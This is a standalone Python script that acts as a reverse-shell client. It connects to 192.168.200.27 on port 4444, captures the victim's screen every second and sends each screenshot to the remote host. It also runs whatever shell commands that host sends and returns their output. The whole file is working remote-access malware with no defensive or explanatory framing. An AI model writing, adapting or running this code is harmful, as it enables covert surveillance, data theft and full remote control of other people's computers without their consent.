import socket
import subprocess
from PIL import ImageGrab
import io
import time

def capture_screen():
    screenshot = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    return img_byte_arr.getvalue()

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.200.27", 4444))
    
    try:
        while True:
            # Capture and send screenshot
            img_data = capture_screen()
            client_socket.sendall(b"SCREENSHOT" + img_data)

            # Receive and execute command
            command = client_socket.recv(1024).decode()
            if command.lower() == "exit":
                break

            output = subprocess.getoutput(command)
            if not output:
                output = "Command executed."
            client_socket.sendall(output.encode())

            time.sleep(1)  # Delay to avoid flooding the server

    except Exception as e:
        print(f"Error: {e}")
    
    client_socket.close()

if __name__ == "__main__":
    connect_to_server()
